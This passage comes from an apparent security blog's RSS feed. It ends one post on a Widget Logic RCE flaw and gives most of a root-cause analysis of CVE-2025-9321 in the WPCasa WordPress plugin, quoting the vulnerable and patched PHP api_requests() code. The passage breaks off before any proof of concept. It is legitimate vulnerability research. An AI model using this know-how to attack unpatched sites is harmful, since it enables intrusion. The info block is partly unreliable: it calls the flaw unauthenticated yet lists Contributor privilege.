input&lt;/strong&gt; and must be strictly controlled.&lt;/li&gt;&#xA;&lt;li&gt;Even the &lt;strong&gt;Contributor&lt;/strong&gt; role can lead to &lt;strong&gt;critical RCE&lt;/strong&gt; if input handling is flawed.&lt;/li&gt;&#xA;&lt;li&gt;Replacing &lt;code&gt;eval()&lt;/code&gt; with a safe parsing approach is the correct direction for plugins that process â€œuser logicâ€.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/widget-logic/vulnerability/wordpress-widget-logic-6-0-5-remote-code-execution-rce-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Widget Logic Plugin &amp;lt;= 6.0.5 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-9321 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-28-cve-2025-9321/</link>
      <pubDate>Fri, 28 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-28-cve-2025-9321/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-28-cve-2025-9321/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The WPCasa WordPress plugin is vulnerable to Code Injection in all versions up to and including 1.4.1. The root cause is insufficient validation and restriction of input within the &lt;code&gt;&#39;api_requests&#39;&lt;/code&gt; function. This allows an unauthenticated attacker to invoke arbitrary functions and execute code.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-9321&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-9321&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.4.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.4.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (10)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wpcasa/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WPCasa Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;WPCasa&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.4.1&lt;/code&gt; â€“ &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.4.2&lt;/code&gt; â€“ &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool&lt;/strong&gt; â†’ &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v1.4.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;api_requests&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;global&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$wp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wpsight-api&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$wp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;query_vars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wc-api&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wpsight-api&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$wp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;query_vars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wc-api&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Buffer,&amp;ensp;we&amp;ensp;won&amp;#39;t&amp;ensp;want&amp;ensp;any&amp;ensp;output&amp;ensp;here&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Get&amp;ensp;API&amp;ensp;trigger&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$api&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;strtolower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_attr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$wp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;query_vars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wpsight-api&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Load&amp;ensp;class&amp;ensp;if&amp;ensp;exists&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;class_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$api&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$api_class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$api&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Trigger&amp;ensp;actions&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;do_action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wpsight_api_&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$api&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Done,&amp;ensp;clear&amp;ensp;buffer&amp;ensp;and&amp;ensp;exit&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_end_clean&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function reads the &lt;code&gt;wpsight-api&lt;/code&gt; parameter from the URL, uses it to instantiate a class if it exists, triggers the associated &lt;code&gt;do_action&lt;/code&gt; hook, and finally terminates with &lt;code&gt;die(&#39;1&#39;)&lt;/code&gt;. The issue is that the URL-supplied data is not tightly controlled, making it easy to exploit for code execution.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version (v1.4.2):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;api_requests&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;global&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$wp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;1)&amp;ensp;Preferred&amp;ensp;getter.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$raw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;get_query_var&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wpsight-api&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;2)&amp;ensp;Fallback:&amp;ensp;directly&amp;ensp;from&amp;ensp;$wp-&amp;gt;query_vars.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$raw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$wp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;query_vars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wpsight-api&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$raw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$wp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;query_vars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wpsight-api&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 